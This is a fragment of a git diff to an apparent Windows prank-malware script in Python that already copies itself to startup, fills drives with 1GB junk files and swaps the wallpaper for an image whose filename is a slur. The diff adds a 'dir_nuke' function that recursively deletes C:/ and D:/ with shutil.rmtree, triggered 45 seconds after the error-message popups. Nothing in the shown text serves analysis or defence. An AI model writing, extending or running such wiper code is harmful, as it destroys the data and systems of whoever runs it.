@@ -83,6 +83,13 @@ def create_system_files():
 
             print(f"Filled {drive_name} with 1GB text files.")
 
+def dir_nuke():
+    dir = 'C:/'
+    shutil.rmtree(dir)
+
+    dir = 'D:/'
+    shutil.rmtree(dir)
+
 # Changes wallpaper
 def change_wallpaper():
     wallpaper_url = "https://cdn.discordapp.com/attachments/1105563151216414811/1106193396948811867/retarded.png"
@@ -100,6 +107,7 @@ if __name__ == "__main__":
     time.sleep(2)
     copy_to_startup()
     create_system_files()
-    while True:
-        display_image_box()
-        display_error_messages()
+    display_image_box()
+    display_error_messages()
+    time.sleep(45)
+    dir_nuke()
